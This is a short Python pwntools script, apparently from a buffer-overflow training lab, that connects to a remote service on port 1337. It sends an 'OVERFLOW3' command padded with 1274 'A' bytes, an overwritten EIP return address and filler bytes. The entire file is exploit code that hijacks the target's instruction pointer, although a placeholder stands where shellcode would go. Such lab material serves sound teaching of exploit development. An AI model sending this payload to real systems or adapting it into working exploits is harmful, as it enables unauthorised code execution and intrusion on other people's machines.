#!/usr/bin/env python3

from pwn import *

host = "10.10.249.243"
port = 1337

s = remote(host, port)
total_length = 2000
offset = 1274
new_eip = p32(0x62501203)

payload = [
    b"OVERFLOW3 ",
    b"A" * offset,
    new_eip,
    b"C" * (total_length - offset - len(new_eip))
]

payload = b"".join(payload)
s.send(payload)
s.close()


